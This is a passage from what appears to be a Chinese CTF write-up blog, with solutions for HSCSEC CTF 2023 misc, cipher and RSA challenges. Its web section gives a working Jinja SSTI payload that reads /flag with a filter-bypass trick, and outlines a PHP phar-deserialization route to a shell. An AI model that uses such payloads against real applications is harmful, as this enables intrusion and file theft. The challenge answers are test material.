class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span></span><br><span class="line">    ]]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = [<span class="number">25588</span>, <span class="number">31114</span>, <span class="number">28727</span>, <span class="number">26722</span>, <span class="number">24948</span>, <span class="number">25135</span>, <span class="number">25480</span>, <span class="number">29029</span>, <span class="number">23025</span>, <span class="number">25775</span>, <span class="number">15411</span>, <span class="number">25423</span>, <span class="number">25202</span>, <span class="number">30031</span>, <span class="number">27380</span>, <span class="number">30734</span>, <span class="number">25054</span>, <span class="number">25109</span>, <span class="number">20741</span>, <span class="number">28568</span>, <span class="number">28802</span>, <span class="number">24591</span>, <span class="number">26063</span>, <span class="number">30940</span>, <span class="number">30375</span>, <span class="number">19411</span>, <span class="number">29573</span>, <span class="number">20845</span>, <span class="number">27232</span>, <span class="number">26743</span>, <span class="number">25779</span>, <span class="number">24986</span>, <span class="number">31498</span>, <span class="number">30978</span>, <span class="number">22945</span>, <span class="number">26563</span>, <span class="number">35012</span>, <span class="number">29994</span>, <span class="number">27016</span>, <span class="number">29535</span>, <span class="number">21342</span>, <span class="number">26573</span>, <span class="number">27569</span>, <span class="number">25408</span>, <span class="number">31567</span>, <span class="number">25503</span>, <span class="number">21385</span>, <span class="number">27207</span>]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        k = s[i][j]</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> dic:</span><br><span class="line">            dic[k] = []</span><br><span class="line">        dic[k].append((i,j))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> dic.items():</span><br><span class="line">    x,y=k.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    x=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    y=<span class="built_in">int</span>(y,<span class="number">16</span>)</span><br><span class="line">    z=(x - <span class="number">55296</span>) * <span class="number">1024</span> + y - <span class="number">56320</span> + <span class="number">65536</span> - <span class="number">128512</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> v:</span><br><span class="line">        num[z] -= t[<span class="number">0</span>]*t[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x00\x00\x00\x00\x00\x00369d9412-f5c8-4aa4-8056-a7e4369d4555\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;369d9412-f5c8-4aa4-8056-a7e4369d4555&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>无</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2023年春秋杯网络安全联赛春季赛，将更加深化人才培养的意义，给予新生代选手更大的舞台，本次比赛特将时长延长至7天，相对于以往的比赛，这是一次前所未有的尝试。同时，赛题难度分布更加合理均衡，题目质量依旧值得让人期待。题目设计涵盖了多个方面的安全技术</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSCSEC CTF 2023 (HSC-2th 2023)</title>
    <link href="https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/"/>
    <id>https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/</id>
    <published>2023-02-12T14:23:55.000Z</published>
    <updated>2023-02-12T16:47:31.210Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</p><p>本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。前十名可获得合作伙伴赞助礼品以及实体证书。</p><p><strong>Rank: 1</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a>SIGNIN</h3><blockquote><p>关注公众号：中龙 红客突击队 发送：HSCCTF{TELLMEFLAG}获取flag！</p></blockquote><p>公众号签到，<code>HSCSEC&#123;W3Ic0m3_t0_HScCtF2tH&#125;</code>。</p><p>​    </p><h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><blockquote><p>flag2为用户登录的密码<br>下载：<br>百度网盘：<a href="https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2">https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2</a><br>提取码：HSC2<br>腾讯网盘：<a href="https://share.weiyun.com/EyhLtHnF">https://share.weiyun.com/EyhLtHnF</a><br>密码：jyk6t9<br>奶牛快传： <a href="https://cowtransfer.com/s/d83e0de581aa49">https://cowtransfer.com/s/d83e0de581aa49</a> 点击链接查看 [ LINUX.rar ] ，或访问奶牛快传 cowtransfer.com 输入传输口令 xgzg82 查看；</p></blockquote><p>非预期，直接16进制查看文件，搜字符串 <code>HSCSEC&#123;</code> 发现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# history</span><br><span class="line">    1  f1aG1:HSCSEC&#123;Lim3_</span><br><span class="line">    2  exit</span><br><span class="line">    3  ubuntu20.04</span><br><span class="line">    4  history</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;flag3:_iez&#125;&quot; &gt; /f1Ag3</span><br></pre></td></tr></table></figure><p>连接得flag：<code>HSCSEC&#123;Lim3_ubuntu20.04_iez&#125;</code>。</p><p>​    </p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p>解压得到 <code>encode_salute</code> 文件，尾部有 <code>525d93ceb70e2bf5daa84ec3d0cd2c731a</code>，md5查询得明文 <code>qwer1234</code>，以此为密钥与文件异或，还原得到rar文件。</p><p>文件里一张jpg图片一张png图片，用stegsolve查看png图片alpha0通道，有 <code>flag2/key that_is</code> 字样。</p><p>再以此为密码，用steghide提取jpg图片的隐藏信息：<code>steghide extract -sf salute.jpg</code>，得到flag文件内容 <code>flag3:_c0ol&#125;</code>。</p><p>连接为flag：<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code>。</p><p>​    </p><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p>png图片尾部有01串+反转的png，提取01串做二维码图，扫出内容 <code>flag2:aQR_c0de_and</code>；反转的png还原为新png图，反色处理得到 <code>HSCSEC&#123;p3G_h</code>。</p><p>少了第三部分，对新png图尝试使用<a href="http://tools.jb51.net/aideddesign/img_add_info">PixelJihad解密</a>，得到 <code>_3nc&#125;</code>。</p><p>连接为flag：<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code>。</p><p>​    </p><h2 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h2><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><blockquote><p>☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲</p></blockquote><p>猜测为八卦+空一一对应9个数字，根据 <code>HSCSEC&#123;&#125;</code> 对应的九进制数，可知7个符号对应的数，剩下的2个测试即可。</p><p>最终对应 <code>80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</code></p><p>转换为十进制：<code>72 83 67 83 69 67 123 67 104 105 110 101 115 101 95 103 48 115 115 112 125</code></p><p>转换为字符串：<code>HSCSEC&#123;Chinese_g0ssp&#125;</code>，还得手动补全单词才正确……</p><p>flag：<code>HSCSEC&#123;Chinese_g0ssip&#125;</code>。</p><p>​    </p><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><blockquote><p>斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴<br>虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐<br>壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马<br>虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓<br>室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐<br>牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌<br>危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐<br>斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡<br>危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴<br>牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎<br>室火猪鬼金羊柳土獐壁水貐</p></blockquote><p>查到每三个字组成的词为28星宿里的一种，且根据方位分别归类到青龙、白虎、朱雀、玄武四大类中：</p><p>青龙：角木蛟、亢金龙、氐土貉、房日兔、心月狐、尾火虎、箕水豹<br>玄武：斗木獬、牛金牛、女土蝠、虚日鼠、危月燕、室火猪、壁水貐<br>白虎：奎木狼、娄金狗、胃土雉、昴日鸡、毕月乌、觜火猴、参水猿<br>朱雀：井木犴、鬼金羊、柳土獐、星日马、张月鹿、翼火蛇、轸水蚓</p><p>按4进制分别替换为0-3，得到 <code>1020 1103 1003 1103 1011 1003 1323 1003 1032 1133 1001 1232 1203 1221 1211 1232 1310 1133 1001 1100 1331</code>。</p><p>转换为十进制：<code>72 83 67 83 69 67 123 67 78 95 65 110 99 105 101 110 116 95 65 80 125</code></p><p>转换为字符串：<code>HSCSEC&#123;CN_Ancient_AP&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = m * e * <span class="number">1</span> * <span class="number">2022</span> * p</span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line"><span class="comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = M^e \bmod n = (2022mep)^e \bmod n$，令 $c’ = c \cdot (2022e)^{-e} \bmod n = (mp)^e \bmod n = (m^ep^{e-1} \bmod n) \cdot p$，</p><p>故 $\gcd(c’,n)=p$，再利用常规RSA求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">cc = c * inverse_mod(<span class="built_in">pow</span>(<span class="number">2022</span>*e,e,n),n)</span><br><span class="line">p = gcd(cc,n)</span><br><span class="line">q = n // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(cc,d,n) // p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;*******************MASK****************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(FLAG)</span></span><br><span class="line">number1 = getPrime(<span class="number">512</span>)</span><br><span class="line">number2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(number1)</span><br><span class="line">result = FLAG * number1 % number2</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$m$ 与 $n_1$ （512位）乘积的大小不会超过 $n_2$ 大小（1024位），故 $c=mn_1$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">c = <span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c//n1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;HSCSEC&#123;&#x27;</span>)</span><br><span class="line">flag_num_list = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">    flag_num_list.append(alphabet.find(item) + <span class="number">1</span>)</span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_num_list:</span><br><span class="line">    m = (i + key_num) % <span class="number">94</span> - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">        c.append(<span class="string">&quot;□&quot;</span>)</span><br><span class="line">    c.append(alphabet[m-<span class="number">1</span>:m])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#x27;</span>.join(c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br></pre></td></tr></table></figure></blockquote><p>代码里面的 <code>key_num</code> 其实固定为0，实际当1，模运算也没啥用，实际是rot1凯撒加密，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">flag = [alphabet[alphabet.index(k)+<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>基本没过滤的SSTI，尝试</p><p> <code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flag").read()&#125;&#125;</code></p><p>报错无法打开 <code>/</code> ，说明 <code>flag</code> 被替换为空，双写绕过即可：</p><p><code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flflagag").read()&#125;&#125;</code></p><p>​    </p><h3 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h3><p>查看首页源码，发现upload和view两个对话框包括关键字段 <code>name=&quot;acti0n&quot;</code>，抓包看到 <code>?acti0n=upload</code> 的访问方式，为文件包含漏洞点。</p><p>通过设置 <code>acti0n</code> 参数和filter过滤器访问，得到 <code>upload.php</code> 和 <code>view.php</code> 源码。审计代码，<code>upload.php</code> 中包含上传文件与拦截过滤危险函数的功能，<code>view.php</code> 中有 <code>eval()</code> 函数，只需要修改类中的私有变量 <code>$cmd</code> 就可以拿到shell。</p><p>其中 <code>file_exists()</code> 函数结合文件上传可以想到phar反序列化漏洞利用。结合 <code>upload.php</code> 中关键字黑名单，使用 <code>show_source()</code> 函数读取 <code>flag.php</code> 